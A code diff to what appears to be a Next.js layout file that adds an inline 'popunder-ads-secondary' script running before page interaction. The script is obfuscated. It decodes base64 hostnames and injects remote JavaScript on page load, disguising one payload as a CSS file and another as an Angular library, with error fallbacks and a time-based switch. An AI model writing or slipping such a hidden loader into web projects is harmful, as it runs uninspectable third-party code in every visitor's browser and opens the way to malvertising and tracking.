@@ -138,6 +138,17 @@ export default function RootLayout({
           }}
         />
         <Script
+          id="popunder-ads-secondary"
+          type="text/javascript"
+          data-cfasync="false"
+          strategy="beforeInteractive"
+          dangerouslySetInnerHTML={{
+            __html: `/*<![CDATA[/* */
+(function(){var n=window,s="b07271ae12a5e828144b454762d4f779",f=[["siteId",586+578+653+5252788],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],x=["d3d3LnZpc2FyaW9tZWRpYS5jb20vY3NvY2lhbC1zaGFyZS5taW4uY3Nz","ZDEzazdwcmF4MXlpMDQuY2xvdWRmcm9udC5uZXQvY0lwUS93c3VydmV5LmFuZ3VsYXIubWluLmpz"],t=-1,d,o,v=function(){clearTimeout(o);t++;if(x[t]&&!(1789904882000<(new Date).getTime()&&1<t)){d=n.document.createElement("script");d.type="text/javascript";d.async=!0;var r=n.document.getElementsByTagName("script")[0];d.src="https://"+atob(x[t]);d.crossOrigin="anonymous";d.onerror=v;d.onload=function(){clearTimeout(o);n[s.slice(0,16)+s.slice(0,16)]||v()};o=setTimeout(v,5E3);r.parentNode.insertBefore(d,r)}};if(!n[s]){try{Object.freeze(n[s]=f)}catch(e){}v()}})();
+/*]]>/* */`,
+          }}
+        />
+        <Script
           id="google-adsense"
           async
           src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-5356953527878151"
